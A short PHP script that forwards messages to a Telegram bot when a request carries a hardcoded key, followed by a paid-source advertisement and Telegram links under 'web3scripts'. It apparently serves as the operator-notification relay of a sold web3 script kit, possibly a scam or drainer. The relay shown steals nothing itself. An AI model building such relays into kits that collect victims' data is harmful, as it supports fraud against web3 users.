<?php

const KEY = '8bEEokUZLhn7nAHz';
const TELEGRAM_TOKEN = 'token';
const TELEGRAM_CHATID = 'chat id';

$key = $_REQUEST['key'];
$message = $_REQUEST['m'];
if ($key == KEY && $message) {
    $ch = curl_init('https://api.telegram.org/bot'.TELEGRAM_TOKEN.'/sendMessage?chat_id='.TELEGRAM_CHATID.'&text='.urlencode(str_replace("<br>", "\n", $message)).'&parse_mode=HTML');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

//#// FULL SOURCE CODE PRICE: 0.4 ETH

// 🔗 Socials:

// Telegram: [@webswaps](https://t.me/webswaps)
// Channel: https://t.me/web3scripts